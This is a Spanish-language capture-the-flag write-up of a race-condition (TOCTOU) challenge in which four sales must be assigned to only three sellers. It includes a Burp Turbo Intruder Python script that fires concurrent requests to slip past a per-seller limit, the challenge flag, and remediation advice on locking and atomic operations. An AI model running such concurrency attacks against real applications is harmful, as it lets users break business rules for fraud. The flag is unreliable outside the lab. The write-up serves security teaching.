# El Analista — Writeup

## Descripción del desafío

**Plataforma:** Software Seguro (HackLab 2024)  
**Categoría:** Condiciones de carrera (Race Condition / TOCTOU)  
**Objetivo:** Existen 4 ventas y 4 vendedores. El objetivo es asociar las 4 ventas a solo 3 vendedores. El sistema implementa una restricción lógica que impide hacerlo de forma normal (por ejemplo, limitando la cantidad de ventas por vendedor).

## Reconocimiento

Al ingresar al panel, vemos dos tablas:
- 4 Ventas (ninguna asociada).
- 4 Vendedores (ninguno asociado).
- Un formulario HTML con dos listas desplegables (`<select>`) para emparejar una Venta con un Vendedor, y un botón "Asociar".

Si intentamos hacer la asignación de forma manual, el sistema seguramente valide los límites antes de guardar el cambio, arrojando un error si intentamos asignarle más de una venta al mismo vendedor.

## Vulnerabilidad

La aplicación es vulnerable a **Race Condition** (Condición de Carrera). 
El backend realiza las operaciones en dos pasos secuenciales:
1. **Verificación (Check):** Consulta en la base de datos si el vendedor ya alcanzó su límite de ventas.
2. **Uso/Escritura (Use):** Si la verificación es correcta, asocia la venta al vendedor.

Si enviamos múltiples peticiones de asociación **exactamente en el mismo milisegundo**, el servidor ejecutará el paso 1 para todas las peticiones al mismo tiempo. Como ninguna ha llegado aún al paso 2, todas pasarán la validación como válidas y se guardarán, rompiendo la regla de negocio. A esta vulnerabilidad se la conoce como **TOCTOU** (*Time of Check to Time of Use*).

## Explotación

### 1. Preparación de la petición
Para explotar esta vulnerabilidad de manera confiable, utilizaremos la extensión **Turbo Intruder** de Burp Suite, diseñada para enviar paquetes con sincronización a nivel de milisegundo.

Interceptamos la petición POST que asocia una venta. En el cuerpo de la petición, reemplazamos el identificador de la venta por `%s`, lo que le indicará a Turbo Intruder dónde inyectar nuestro payload:
`(Ejemplo: id_venta=%s&id_vendedor=1)`

### 2. Ataque Concurrente (Turbo Intruder - Método Cluster Bomb)
Enviamos la petición a Turbo Intruder. En este caso, la técnica es bombardear el servidor combinando todas las ventas posibles con 3 de los vendedores al mismo tiempo. Al saturar la base de datos con peticiones concurrentes, el servidor no llega a bloquear las asignaciones antes de que se completen.

Configuramos el script en Python para usar `Engine.THREADED` y probar todas las combinaciones:

```python
def queueRequests(target, wordlists):
    # Inicialización del motor multihilo
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.THREADED)

    # Listas de IDs a combinar
    ventas = ['1', '2', '3', '4']
    vendedores = ['1', '2', '3']

    # Generar todas las combinaciones posibles
    for vendedor in vendedores:
        for venta in ventas:
            # El primer %s -> 'venta', el segundo %s -> 'vendedor'
            payloads = [venta, vendedor]
            engine.queue(target.req, payloads)

def handleResponse(req, interesting):
    # Mostrar solo las peticiones exitosas
    if req.response_status == 200:
        table.add(req)
```

Al lanzar el ataque (botón Attack), se enviarán 12 peticiones de forma agresiva. Varias colisionarán y lograrán asignarse exitosamente, logrando que las 4 ventas queden empaquetadas en esos 3 vendedores antes de que el servidor aplique la restricción.

## Resultado / Flag
**Flag:** `db1ab6987f0624b58ae72fa69aba4d14`

## Causa raíz y remediación

- **Causa raíz:** Existe una vulnerabilidad de concurrencia tipo **TOCTOU (Time of Check to Time of Use)**. El código del backend verifica si el vendedor tiene ventas disponibles (Check) y luego, en una operación separada en la base de datos, inserta o actualiza la nueva venta (Use). Al no haber un mecanismo de bloqueo (Lock) entre estas dos operaciones, múltiples hilos ejecutándose en paralelo pueden pasar el "Check" simultáneamente antes de que ninguno haya ejecutado el "Use".
- **Remediación recomendada (OWASP):**
  1. **Bloqueos a nivel de base de datos (Row-level locking):** Utilizar sentencias como `SELECT ... FOR UPDATE` al consultar la cantidad de ventas del vendedor. Esto bloquea la fila hasta que termine la transacción, obligando a los demás hilos a esperar su turno.
  2. **Niveles de Aislamiento Transaccional:** Configurar la base de datos con un nivel de aislamiento `SERIALIZABLE` para operaciones críticas.
  3. **Operaciones Atómicas:** En lugar de leer, calcular en memoria y luego escribir, delegar la restricción directamente al motor de la base de datos mediante constraints o condicionales en el `UPDATE` / `INSERT`.
